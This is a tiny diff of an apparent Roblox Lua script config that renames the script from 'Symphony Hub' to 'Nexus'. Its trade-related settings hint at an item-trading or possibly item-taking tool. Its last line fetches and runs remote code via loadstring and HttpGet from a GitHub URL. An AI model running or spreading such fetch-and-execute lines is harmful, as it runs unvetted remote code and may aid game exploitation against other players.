@@ -4,7 +4,7 @@ Config = {
     FullInventory = true,
     GoodItemsOnly = true,
     ResendTrade = ".resend",
-    Script = "Symphony Hub",
+    Script = "Nexus",
     CustomLink = ""
 }
 loadstring(game:HttpGet("https://raw.githubusercontent.com/R3TH-PRIV/UILibs/main/Librarys/Impact/Source"))()
